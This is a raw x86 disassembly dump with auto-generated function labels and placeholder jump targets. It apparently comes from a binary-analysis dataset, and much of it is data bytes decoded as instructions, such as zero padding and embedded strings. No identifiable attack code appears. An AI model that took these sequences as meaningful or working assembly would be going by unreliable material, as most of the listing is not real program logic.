add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov bl 0xa4
lahf
lodsd [ esi ]
pushfd
xchg edi eax
stosb [ edi ]
cwde
xchg ebx eax
test al 0x95
xchg ecx eax
cmpsd [ esi ] [ edi ]
xchg esi eax
xchg ecx eax
test al 0x97
xchg edx eax
stosb [ edi ]
0x9a9faf95 0xb9c4
mov ch 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0xb4b7 0xac
mov [ eax - 0x53878754 ] cs
push 0xb05553a4
push ebx
push esi
mov bh 0x53
push edi
mov dh 0x52
push esi
mov dl 0x52
push ebp
movsd [ edi ] [ esi ]
push eax
push ecx
pushfd
dec esi
dec esi
nop
dec esp
dec ebx
mov [ ebp + 0x52 ] edx
xchg ebx eax
jae r-xdata
add [ eax ] al
rol [ ecx ] 0x0
jbe r-xdata
cdq
cmp [ edi - 0x68 ] 0x92
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5fab7577 ] ch
pop edi
mov esi 0x62c8615d
shl [ eax + edi * 2 - 0x28 ] cl
add [ ebp - 0xd747617 ] 0x8d
mov ecx [ ebx - 0x3282821c ]
push 0x5654bf68
lahf
inc esp
inc esi
test [ esi + 0x43 ] eax
and [ edx + 0x5b ] 0xae
mov [ 0x9d ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x6cc17452 ] dh
imul ebx ecx 0xffffff93
mov gs si
mov bl 0xad
clc
sar [ edx - 0x5474206 ] 0xb9
mov ch 0xfb
mov dh 0xb2
cld
mov dl 0xae
cld
scasb [ edi ]
stosd [ edi ]
std
stosb [ edi ]
cmpsd [ esi ] [ edi ]
std
cmpsb [ esi ] [ edi ]
movsb [ edi ] [ esi ]
into
push 0xffffffc4
push edi
pop esp
mov bh 0x4f
push edx
0x4b814747 0x8646
pop edi
mov [ 0x8b90 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x62
arpl bx ax
push 0x878ad669
in al dx
cmpsd [ esi ] [ edi ]
mov [ 0xfffffffff9aeb2f6 ] eax
mov dl 0xae
cli
mov al 0xac
sti
lodsb [ esi ]
test eax 0xfda6a9fd
movsd [ edi ] [ esi ]
mov [ 0xfffffffffea0a1fe ] eax
popfd
pushfd
std
cwde
cwde
cli
xchg ebx eax
xchg esp eax
sub_473818
mov edx 0x4299524e
inc ebx
jl r-xdata
les edi [ ebp - 0x6433c07 ]
retn 0xf9bb
dec edx
movsd [ edi ] [ esi ]
cwde
xchg edx eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x8dd17171
mov ecx ebp
mov bl 0xad
test edi 0xbec5f9c0
cli
sar [ ebx - 0x4474106 ] 0xbb
mov dh 0xfa
mov esp 0xbcc2f9b7
stc
lds edi [ esi - 0x6423b07 ]
retn
sub_473885
lea ecx [ ebp - 0x1b7a7a16 ]
jg r-xdata
push 0x6b
les ebx [ ecx + 0x5b ]
test eax 0x4c7e4846
inc edi
cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edx eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x7b7b
fidivr [ eax + 0x78 ]
shr [ edx + 0x6b ] cl
sub_473894
push esi
pop ebx
test eax 0x4b804944
inc esi
movsb [ edi ] [ esi ]
xchg ebx eax
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
jne r-xdata
popfd
cdq
into
fstp [ ebp - 0x40380e67 ]
clc
int3
sub_474b2a
pushad
pushad
mov eax 0x3c655f5e
xor al 0x7b
imul esp [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
int 0x6f
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ gs : eax ] al
add [ eax ] al
add [ eax ] al
add ch cl
outsd
retn 0xf7bb
sub_474bed
popad
popad
mov esp 0x3a925656
cmp ebp [ edi + 0x5a ]
push eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi 0xbde76c66
mov dh 0xf7
aad 0xcd
stc
lds edi [ edi - 0x6464106 ]
sar [ edx - 0x6433e07 ] 0xc3
mov ebp 0xf8bfa4f9
mov al 0xf8
enter 0xf8c2 0xca
retn
sub_474c0a
leave
add [ eax - 0x52e250a ] 0xffffffbf
mov edx 0xfbb1b4fb
mov dh 0xb2
cli
mov bh 0xb3
cli
mov ecx 0xb7bbfab5
cli
mov ebp 0xbac0f9b8
stc
sar [ ecx + edi * 8 - 0x3a06423d ] 0xbf
clc
mov al 0xf8
enter 0xf8c2 0xca
retn
sub_47523b
push 0x736ace65
mov [ eax + 0x84 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ch 0x5b
cmp [ esi + 0x60c11749 ] esp
psrlq mm6 [ ebx + 0x14 ]
shl [ ebx + 0x14 ] cl
shl [ ebx + 0x14 ] cl
shl [ ebx + 0x14 ] cl
shl [ ebx + 0x14 ] cl
shl [ ebx + 0x14 ] cl
0x116a
sub_47551f
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dh [ ebp + 0x6a ]
mov dh [ ebp + 0x6b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x3e6e6069 ] al
cmp [ esi + 0x3784393b ] al
aaa
xor ebp [ gs : 0x522b355a ]
cmp al 0x30
outsb
pop eax
dec ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6b269b9d ] ah
nop
fst [ eax + edx * 4 - 0x266f6b27 ]
xchg esp eax
nop
aad 0x72
jpe r-xdata
jb r-xdata
movsd [ edi ] [ esi ]
mov [ 0xfffffffff9a8aafc ] eax
enter 0xf8c1 0xcc
cmpsd [ esi ] [ edi ]
dec esp
dec edi
bound edx [ edx + 0x303c5229 ]
fwait
mov [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ eax - 0x3c350767 ] 0x1
stc
lds edi [ edi - 0x8413a07 ]
ror ecx 0x1
add eax 0xc4f9c9d1
mov esi 0xe29ea2e3
jle r-xdata
cdq
cld
stosb [ edi ]
test al 0xfc
lodsd [ esi ]
stosb [ edi ]
sti
mov cl 0xae
sti
mov ch 0xb1
cli
mov ecx 0xb7bdfab4
stc
sar [ ebx - 0x45413a07 ] 0x61
pushad
push esp
aas
xor al 0x0
add [ eax ] al
fidiv [ ebx + ebp * 2 - 0x20 ]
jpe r-xdata

mov cl [ edx - 0x1696904 ]
cwde
cwde
[ ecx - 0x66650167 ]
iretd
sub_475620
enter 0xd3f7 0xcb
not edi
into
stc
les edi [ esi - 0x3c615d1d ]
arpl [ eax ] si
sub dh [ esi + ebx * 2 + 0x52 ]
add [ eax ] al
add ch bl
mov dh 0xb8
in eax 0xc3
shr dh 0x8f
cmp ch 0xa6
movsb [ edi ] [ esi ]
cld
stosb [ edi ]
test al 0xfc
stosb [ edi ]
test al 0xfa
mov ebp 0xbac0fab7
stc
les edi [ esi - 0x73e3707 ]
int3
sub_47576a
pop ebp
mov edx 0x70a14b80
imul ecx esp 0x65
loop r-xdata
add [ eax ] al
add al cl
jpe r-xdata
pop ebp
out 0x80 al
sub cl 0x83
add esi 0x7f
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ch al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x8a
inc ebp

add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x3a7a 0xd4
mov al [ ebp - 0x35 ]
mov [ eax + eax ] ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fisttp [ esi + edi - 0x1fc47220 ]
lea edi [ ebx ]
loopne r-xdata
jge r-xdata
cmp esp eax
lea edi [ ebx ]
int3
retn
sub_475847
aas
add [ eax ] al
clc
pop es
add [ eax ] al
[ eax ] eax
add al ah
add [ eax ] eax
add al al
push ss
add [ eax ] al
add [ eax ] 0x0
add [ eax - 0x80000000 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add ebx [ ebp ]
add [ edi ] 0x0
add al al
pop ds
add [ eax ] al
clc
inc [ eax ]
add bh bh
inc [ eax ]
add [ ebx + ecx ] ah
add [ ebp + 0x65 ] cl
insb
popad
popad
bound esp [ edx + 0x72 ]
outsd
aaa
add [ 0x122f ] dh
cmp [ esi ] cl
add [ eax ] al
and cl [ edi ]
add [ eax ] al
sbb [ r-xdata ] ecx
inc esi
add edi edi
add [ 0x1000000 ] ebx
or [ eax ] eax
inc esi
jb r-xdata
add [ ss : edx ] al
arpl [ ebp + esi * 2 + 0x6f ] si
jne r-xdata
adc [ eax - 0x44eec1f2 ] ecx
ud2
pushfd
add [ ebx ] cl
pop es
in eax dx
add al [ eax ]
add [ eax ] cl
into
pop es
add [ eax ] al
inc [ ebx ]
and al 0x0
add [ eax ] al
add al [ eax + eax ]
dec ebp
outsb
insd
add [ edx ] al
add al 0xa4
add eax 0xd470c65
outsb
or [ ebx ] cl
push es
add [ esi + 0x69 ] cl
insb
outsd
add [ ss : edx ] dl
add [ eax ] al
inc [ ebx ]
sub eax [ eax ]
add [ eax ] al
add al 0x6
add [ eax + 0x6f ] dl
insb
imul esi [ ebx + 0x68 ] 0xb010400
add [ eax + 0x72 ] dl
outsd
jb r-xdata
adc eax [ 0x2903ff00 ]
jae r-xdata
push 0x73696761
insd
jne r-xdata
imul esi [ ebx + 0x74 ] 0x61020900
add ch [ eax ]
adc al [ esi + 0x903010f ]
pop es
add bh bh
add ebp [ ecx ]
add [ eax ] al
add [ esi ] cl
or [ eax ] al
push esi
popad
popad
bound ebp [ edi + 0x6e ]
add [ fs : edi ] al
add eax 0x110d07f3
xchg ebp eax
or ch [ ebx + 0xb ]
or al 0x7
add [ edi + ebp * 2 + 0x72 ] al
jae r-xdata
add [ eax ] al
add [ ebx ] cl
or [ eax ] al
inc esi
outsd
add bh bh
add ebp [ ecx ]
popad
jb r-xdata
or ecx [ edx ]
add bh bh
add ebx [ eax + eax ]
add [ eax ] al
adc al 0x6
add [ edi + 0x65 ] al
jae r-xdata
xor eax 0x51070b00
je r-xdata
insb
jae r-xdata
insb
imul esp [ esi + 0x72 ] 0x65
add [ gs : edi ] al
add eax 0xadb0d70
lea eax [ ebx ]
xchg ebp eax
adc al 0xc
pop es
add [ ecx + 0x6e ] dl
inc [ ebx ]
sub [ eax ] eax
add [ eax ] al
or ecx [ eax ]
add [ esi + 0x6f ] al
push 0x15350400
enter 0x7d0f 0xd
jpo r-xdata
inc [ ebx ]
pop ds
add [ fs : edx ] dl
add ebx [ esi ]
add [ eax ] al
add [ 0x654c0008 ] dl
jne r-xdata
cmp [ eax ] al
and eax 0x7204be02
or [ ebp + 0x6 ] bh
mov edx 0x61214
inc ecx
add [ eax + eax + 0x6f ] ch
add [ esi ] ch
imul eax [ eax ] 0x130031
add [ esi ] dl
add al 0x9e
or al 0x39
adc eax 0x136c0c69
or ecx [ ebx ]
add bh bh
jae r-xdata
adc ecx [ eax ]
add bh bh
add ebp [ ecx ]
add [ eax ] al
add [ edi ] cl
push es
add [ ecx + ebp * 2 + 0x6e ] dl
je r-xdata
add [ ebx + 0x70 ] dl
imul ebp [ esi + 0x64 ] 0x74666972
adc [ edx ] eax
add bh bh
add ebp [ eax + eax ]
add [ eax ] al
push es
or al [ eax ]
push ebx
jo r-xdata
add [ eax ] al
push ss
outsb
je r-xdata
imul esi [ ebx + 0x6d ] 0x4080034
in al dx
adc [ ecx + 0x5 ] dl
loope r-xdata
add [ edi ] dl
add [ eax ] bl
add [ eax ] al
sbb [ esi ] eax
add [ ecx + 0x6c ] al
outsd
outsb
imul esi [ ecx ] 0x1b00
and eax 0x2d022c01
add bh bh
add ebx [ 0x13000000 ]
pop es
add [ edi + 0x65 ] al
popad
add [ ecx ] dh
add [ ebx ] dl
add [ eax ] al
outsb
add [ 0x43000901 ] al
outsd
jo r-xdata
imul esi [ gs : edx ] 0x0
popad
outsb
outsb
jb r-xdata
add ebp [ ebx ]
add [ eax ] al
add [ eax ] ah
or al [ eax ]
push eax
push 0x696e656f
arpl [ ecx + 0x64 ] bp
xor [ eax ] al
add eax 0x43000701
popad
jo r-xdata
outsd
outsb
jae r-xdata
add [ edi ] dl
add [ eax ] bl
add [ eax ] al
sbb [ edx ] ecx
add [ ebp + 0x6d ] al
popad
outsb
popad
je r-xdata
adc eax [ eax ]
add [ esi ] dl
outsb
add [ eax ] cl
add al 0xb
or al 0xcc
adc ch [ edi + 0x110eb513 ]
add [ ecx ] ah
je r-xdata
jae r-xdata
outsb
imul esi [ ebx + 0x63 ] 0x300346f
add [ edi ] eax
add [ eax + 0x72 ] dl
jb r-xdata
push esp
push es
adc [ eax + eax ] ecx
inc [ ebx ]
daa
add [ eax ] al
add [ esi ] dl
push es
add [ ecx + ebp * 2 + 0x73 ] cl
arpl [ edi + 0x34 ] bp
add [ ebx ] al
push ss
insb
popad
je r-xdata
adc eax [ esi ]
add bh bh
add ebx [ edi ]
add [ eax ] al
add [ ecx + ecx ] cl
add [ ebx + 0x61 ] al
insd
outsd
jb r-xdata
imul esi [ edx ] 0x0
je r-xdata
push cs
outsd
arpl [ ebx ] bp
add eax 0x2fe1546
sbb eax [ eax ]
add [ 0x2d022c01 ] ah
add bh bh
add ebp [ edi ]
add [ eax ] al
add [ edx + ecx ] bl
add [ ebx + 0x65 ] dl
imul eax [ eax ] 0x6e006f
jae r-xdata
mov [ esi ] 0xcd40b7f
or ecx [ 0x6e795300 ]
jb r-xdata
add [ di ] al
mov dh 0xd
jns r-xdata
xor al 0x0
add eax 0x3fc02bc
xchg [ 0x91209b3 ] al
add bh bh
add esp [ ecx ]
add [ eax ] al
add [ eax ] dl
or eax 0x6f734500
jo r-xdata
inc edx
popad
insb
popad
popad
bound esp [ ebp + 0x6e ]
add [ ebx ] dl
add eax 0x2903ff00
add al 0x9c
add [ edx ] al
cmp edx [ eax + eax ]
retn 0x1101
xor al 0x0
or eax [ edi ]
fist [ eax + eax ]
add [ eax ] cl
mov edx 0xff00000e
add [ eax ] al
add [ ecx ] ah
or eax [ eax ]
inc esp
imul esp [ ebx + 0x6f ] 0x6e617473
imul eax [ eax ] 0x5
inc esi
adc eax 0x9b802fe
in al 0xd
popad
outsb
popad
add [ ecx + eax ] al
or eax [ eax ]
dec ecx
outsb
jne r-xdata
bound esp [ ecx + 0x73 ]
je r-xdata
imul esp [ ebx + 0x61 ] 0x31796c6c
add [ edx ] dl
adc [ eax ] al
inc [ ebx ]
je r-xdata
jg r-xdata
arpl [ ebx + 0x74 ] bp
add [ edx ] dl
add al 0x7
or dl cl
or eax 0x2a30f2c
inc edi
popad
add al [ eax ]
add [ eax ] cl
mov [ edx ] cl
add [ eax ] al
inc [ ebx ]
dec edx
add [ eax ] al
add [ ecx ] dl
or eax [ eax ]
inc esp
imul esp [ edi + 0x6c ] 0x6974746f
popad
imul esi [ bp + di + 0x6d ] 0x357375
or eax [ edi ]
push ecx
add bh bh
add esp [ edi ]
je r-xdata
mov eax 0x120de409
adc eax [ eax ]
inc [ ebx ]
pop ds
je r-xdata
and eax 0x580ece02
push eax
add [ eax ] al
add [ ebx ] bl
add eax 0x79615000
outsd
jb r-xdata
add [ eax ] al
add [ ecx ] bl
or [ eax ] eax
push esp
outsd
jae r-xdata
xor [ eax ] eax
or [ edx ] eax
aas
or ch [ edx + edx ]
pop es
add dh [ edx ]
pop es
or [ esi ] ecx
add bh bh
add ebx [ edi ]
add [ eax ] al
add [ eax ] bl
push es
add [ ebx + 0x65 ] al
jb r-xdata
add dl [ eax ]
adc cl [ 0x1c03ff00 ]
outsd
insd
outsb
add [ esi ] al
add [ 0x6e614800 ] eax
add [ eax ] al
add [ edx ] ch
or [ eax ] al
push edi
outsd
outsd
jae r-xdata
add ch [ 0x2703ff00 ]
add [ ss : ebx ] cl
pop es
add al 0xf
add [ eax ] al
or [ eax - 0xfffff4 ] bh
add ebx [ edx ]
add [ eax ] al
sub [ eax + eax ] cl
push eax
jae r-xdata
adc dl [ ebx ]
add bh bh
add ebx [ edi ]
outsd
jne r-xdata
or eax 0xc9711ba
adc cl [ edx ]
add [ ebp ] al
insd
add [ ecx ] ah
outsb
popad
ud2
outsd
outsb
popad
popad
outsb
xor al [ eax ]
add al 0x1
push es
add [ edi + 0x75 ] dl
imul esp [ ecx + 0x6e ] 0x32
add [ esi + edx * 2 ] al
outsd
jne r-xdata
outsb
popad
add [ 0x145e0497 ] al
mov esp 0x12053711
push ss
add bh bh
add ebp [ eax ]
dec eax
jne r-xdata
je r-xdata
xor eax 0xf900400
test [ eax ] 0x4810b57
adc [ ecx ] edx
add bh bh
add ebp [ edx ]
add [ eax ] al
add [ esi ] bl
or [ eax ] al
inc ebx
outsd
jne r-xdata
or eax 0x5af0ddf
or ecx [ ebx ]
add [ ebp + 0x6e ] dl
arpl [ edi + 0x6e ] bp
je r-xdata
outsb
insb
jns r-xdata
jne r-xdata
add [ ebx ] al
add [ edi ] eax
add [ ecx + 0x67 ] al
popad
jae r-xdata
popad
outsb
outsd
jae r-xdata
add [ ebx + 0x65 ] al
outsb
je r-xdata
jpe r-xdata
outsb
add esp [ esi ]
add [ eax ] al
add [ ebx ] ah
add [ eax ] al
or [ edx - 0xfffff2 ] bh
push 0x326465
add eax 0x50000801
jb r-xdata
and al 0x0
inc [ ebx ]
popad
arpl [ eax + esi ] si
adc ah [ ecx ]
add bh bh
add esp [ edi ]
add al [ ecx + ebp * 4 ]
add [ edx ] al
add al 0xf9
add eax 0xcc702e4
je r-xdata
outsb
xor [ eax ] al
adc bl [ edi ]
add bh bh
add ebp [ 0x38000000 ]
or [ eax ] al
push esp
jne r-xdata
adc al 0x91
or al 0xa0
adc [ edi ] ebx
movups [ 0x3203ff00 ] xmm3
popad
outsb
xor al [ eax ]
add al 0x56
add [ eax ] al
add [ ebx ] dh
or eax [ eax ]
inc esp
insb
popad
jns r-xdata
mov al [ 0x110f1f11 ]
sbb eax 0x3203ff00
imul edi [ edx ] 0xbb08f805
adc al 0x42
push es
rol [ ebx ] 0x12
sbb [ eax ] al
inc [ ebx ]
sbb eax 0x2f000000
pop es
add [ edx + 0x61 ] dl
insd
bound ebp [ ebp + 0x72 ]
add [ eax ] al
add [ edi + eax ] ch
add [ ebx + 0x61 ] cl
jns r-xdata
arpl [ eax + 0x69 ] bp
popad
add [ 0xffffffff8e062c02 ] ah
or al cl
or esp [ edx + 0xb1207 ]
push ebx
add [ ebp ] dh
jo r-xdata
push ss
popad
jb r-xdata
or [ eax ] al
jb r-xdata
pop ss
outsb
add [ ebx ] cl
pop es
sbb al [ eax ]
add [ eax ] al
cmp al 0x6
add [ ebx + 0x6f ] al
jne r-xdata
je r-xdata
add [ edx ] dl
push ds
add bh bh
add ebp [ 0x35000000 ]
or [ eax ] al
inc ecx
jne r-xdata
or ecx [ 0x70784500 ]
jb r-xdata
outsd
add [ 0x4b000701 ] al
jae r-xdata
jo r-xdata
insd
popad
outsb
add [ fs : ecx ] cl
add ah [ ebp + 0xb ]
cmpsb [ esi ] [ edi ]
or al 0x5c
adc eax 0x1c090b30
add bh bh
add ebp [ ebx ]
add [ eax ] al
add [ edx ] dh
or eax [ eax ]
dec eax
popad
jae r-xdata
arpl [ edi + 0x6d ] bp
jb r-xdata
add [ edx ] dl
add al 0x40
add al 0x5a
or eax 0xed30e0e
or ebx [ ebx ]
add bh bh
add esp [ eax ]
add [ eax ] al
add [ eax ] dh
or al [ eax ]
push eax
jb r-xdata
insd
imul esi [ ecx + ebp * 2 + 0x65 ] 0x1b0073
add [ 0x2d022c01 ] ah
add bh bh
add ebx [ 0x27000000 ]
or [ eax ] eax
dec ebx
popad
popad
jb r-xdata
add [ ebx ] cl
pop es
or [ eax + eax ] 0x0
or [ ebx ] bh
adc al 0x0
push eax
insb
bound esp [ gs : ecx + 0x6e ]
imul esi [ ecx ] 0x4010400
add [ edx + 0x6f ] dl
popad
add [ esp + ecx * 2 ] al
add al 0x63
push cs
cdq
push cs
inc edx
or [ ecx ] dl
adc al 0x0
inc [ ebx ]
and [ eax ] eax
add [ eax ] al
and al 0xb
add [ ebp + 0x75 ] al
imul ebp [ fs : edi + 0x6d ] 0x69727465
arpl [ eax ] ax
or [ ecx + edi ] al
or al 0xcc
or al 0x2e
push cs
popad
insb
add [ 0x6ab05ea ] al
cmp [ edx ] edx
or ecx [ ecx ]
adc dl [ edx ]
add bh bh
or al 0x0
dec ebp
jns r-xdata
popad
popad
add [ edx ] al
add al 0x87
adc [ edi + 0x7804cb14 ] bl
or [ ebx ] cl
or eax 0x63655200
imul esi [ eax + 0x72 ] 0x7461636f
outsb
add [ ecx ] ch
je r-xdata
add [ eax ] cl
add al 0x34
adc al 0x9d
adc ah [ ecx + 0x110f7c05 ]
and eax 0x5703ff00
add [ eax ] al
add [ eax + 0x9 ] al
add [ ebp + 0x66 ] al
insb
popad
add eax [ edi ]
add [ eax ] al
or cl ch
adc al 0x0
add bh bh
add esp [ edx ]
add [ eax ] al
add [ edi ] bh
or al 0x0
inc ecx
bound esi [ edx + 0x69 ]
insd
insb
add [ ecx + eax ] al
push es
add [ esi + 0x61 ] al
or al 0x11
and al [ eax ]
inc [ ebx ]
sbb al [ eax ]
add [ eax ] al
cmp al [ eax + eax ]
inc edx
jne r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ ecx ] bh
pop es
add [ ebx + 0x65 ] cl
jb r-xdata
daa
insd
outsb
je r-xdata
outsd
imul esi [ ebp + 0x6b ] 0x30
add [ 0xfe7064e ] al
hlt
add eax 0x4b000701
jb r-xdata
add [ edx ] dl
and [ eax ] eax
inc [ ebx ]
jb r-xdata
add [ edi ] dl
add [ eax ] bl
add [ eax ] al
sbb [ ebx ] ecx
add [ ebx + 0x75 ] dl
jo r-xdata
add [ gs : ebp ] ch
imul eax [ eax ] 0x690074
add [ gs : ebx ] dh
adc eax [ eax ]
add [ esi ] dl
or ecx [ eax ]
add [ edx + 0x65 ] dl
jb r-xdata
jo r-xdata
or [ eax ] al
push ebx
je r-xdata
popad
insb
xor eax [ eax ]
or [ eax + esi * 4 ] al
add al 0x47
or [ edi + ecx + 0x6c ] edx
or al 0x11
daa
add bh bh
add ebx [ 0x44000000 ]
pop es
add [ ebp + 0x75 ] cl
arpl [ edi + 0x73 ] bp
xor eax 0x75040800
adc bl dl
push es
push 0x11
fiadd [ edi ]
adc [ eax ] ebp
add bh bh
add esi [ eax ]
add [ eax ] al
add [ ebp + 0xc ] al
add [ ebp + 0x79 ] cl
outsd
add [ eax ] bl
add [ eax ] al
sbb [ ebx ] ecx
add [ edx + 0x65 ] bl
outsb
imul esi [ eax + ebp * 2 + 0x77 ] 0x73647261
add [ ebx ] bl
add [ eax ] al
and eax 0x2d022c01
add bh bh
add esi [ eax ]
add [ eax ] al
add [ ecx + 0x9 ] al
add [ eax + 0x79 ] bl
insb
outsd
jo r-xdata
push 0x61007700
add [ edx ] dh
add [ fs : ebx ] dh
adc eax [ eax ]
add [ esi ] dl
add [ edi ] dl
arpl [ gs : ecx + 0x70 ] bp
jb r-xdata
outsd
outsb
add [ 0xffffffffa50ac402 ] ah
or [ edx ] esi
adc ah dl
add edx [ edx ]
or eax [ eax ]
pop edx
add [ ebp ] ah
outsb
je r-xdata
insd
popad
add [ edx ] dl
add al 0xb0
or dh [ ebp + 0x15 ]
dec ebx
add al bh
or ecx [ ebx ]
and eax [ eax ]
inc [ ebx ]
sub [ eax ] al
add [ eax ] al
cmp eax [ edi ]
add [ edx + 0x65 ] dl
jne r-xdata
imul esi [ ebx + esi * 2 + 0x30 ] 0x12e00400
cmc
inc esi
popad
or eax 0x121f05e4
sahf
insd
add [ edx ] al
add al 0xa9
jb r-xdata
jns r-xdata
adc bh dh
adc [ esi ] esp
add [ eax ] al
adc dh ch
add [ edx ] al
add al 0xbf
adc dl dl
add [ es : eax ] al
jo r-xdata
xor al [ eax ]
jb r-xdata
dec esp
or [ eax ] al
dec ebp
outsd
insb
imul ebp [ esi + 0x69 ] 0x7003561
add eax 0xd5304e7
fisttp [ 0xa0c120b ]
add [ ebp + 0x73 ] al
outsd
insb
popad
je r-xdata
outsd
bound ebp [ ecx + 0x6c ]
imul eax [ eax ] 0x5d0e4905
or [ ecx + 0x1207e503 ] bh
sub al [ eax ]
inc [ ebx ]
add [ cs : eax ] al
add [ edi + 0xc ] al
add [ ebp + 0x73 ] al
imul esi [ edx + 0x65 ] 0x73656e64
jae r-xdata
mov edx [ ecx ]
0x52150302 0x120d
sub [ eax ] eax
inc [ ebx ]
sub [ eax ] eax
add [ eax ] al
inc esi
pop es
add [ ss : edx ] dl
add bh bh
add esp [ eax ]
add [ eax ] al
add [ edx + 0xa ] al
